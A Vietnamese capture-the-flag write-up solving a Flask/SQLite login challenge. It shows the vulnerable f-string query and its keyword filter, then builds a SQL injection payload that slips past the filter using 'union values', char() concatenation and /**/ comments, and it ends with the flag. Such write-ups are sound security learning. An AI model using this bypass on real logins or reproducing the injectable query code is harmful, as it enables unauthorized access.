# Task
![image](https://hackmd.io/_uploads/H1UGQ6Yvp.png)

## Recon
Trang web không có gì hết cả chỉ có một ô nhỏ để mình có thể điền thông tin như là username và password thôi
Vì thế ta triển khai việc đọc source code
```python=
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import urllib
import os
import sqlite3

app = Flask(__name__)
app.secret_key = os.urandom(32)
from flask import _app_ctx_stack

DATABASE = 'users.db'

def get_db():
    top = _app_ctx_stack.top
    if not hasattr(top, 'sqlite_db'):
        top.sqlite_db = sqlite3.connect(DATABASE)
    return top.sqlite_db


try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    uid = request.form.get('uid', '').lower()
    upw = request.form.get('upw', '').lower()
    level = request.form.get('level', '9').lower()

    sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
    for x in sqli_filter:
        if uid.find(x) != -1:
            return 'No Hack!'
        if upw.find(x) != -1:
            return 'No Hack!'
        if level.find(x) != -1:
            return 'No Hack!'


    with app.app_context():
        conn = get_db()
        query = f"SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};"
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG
        except:
            return 'Error!'
    return 'Good!'


@app.teardown_appcontext
def close_connection(exception):
    top = _app_ctx_stack.top
    if hasattr(top, 'sqlite_db'):
        top.sqlite_db.close()


if __name__ == '__main__':
    os.system('rm -rf %s' % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
        conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
        conn.commit()

    app.run(host='0.0.0.0', port=8001)
```
Có thể thấy được rằng để có thể lấy được flag thì uid của chúng ta phải là 'admin' nhưng mà khổ nỗi ở trong database lại không có user nào là admin cùng với đó là bị filter khá là căng nên mình nghĩ mình có thể khiến cho chương trình chỉ hiện thị ra mỗi một cái bảng với cột uid = admin
Thử nghiệm ở trên sqlite online với câu lệnh như sau
```python=
SELECT uid FROM users WHERE uid='dream' and upw='' and level=0 union select 'admin' as uid;
```
Ra được một kết quả khá là khả quan
![image](https://hackmd.io/_uploads/H1SmS6Fwp.png)

Nhưng hệ thống đã filter cái chữ 'select' nên mình phải tìm hướng khác theo như tài liệu của sqlite thì union có thể bắt đầu với 'values'
![image](https://hackmd.io/_uploads/rJ4Rv6Kvp.png)
Như vậy câu lệnh của chúng ta sẽ đi có dạng là
```python=
SELECT uid FROM users WHERE uid='dream' and upw='' and level=0 union values('admin');
```
Nhưng tại sao union lại có thể đi cùng với values thì với sự trợ giúp của chat gpt và đi coi các write up khác thì mình có thể hiểu được như sau
Việc sử dụng ```union values``` là để tạo một bảng ảo với giá trị bên trong là chữ 'admin' và cái cột được đặt cho cái bảng ảo có cột uid chứa giá trị là admin thôi
![image](https://hackmd.io/_uploads/r1xLYTKDT.png)
Và do chữ admin cũng bị filter rồi nên là ta sẽ sử dụng char() ở trong sqlite để ép kiểu về dạng ascii và dùng || để nối chuỗi và dùng /**/ như là một cách để bypass khoảng trắng

final payload
```
uid=&upw=&level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
```

# Flag
![image](https://hackmd.io/_uploads/BJbfq6tDa.png)

CHH{uS1nG_5yN7@x_d149raM_93977eb6d7e28dc064a9ea22ab63d2bf}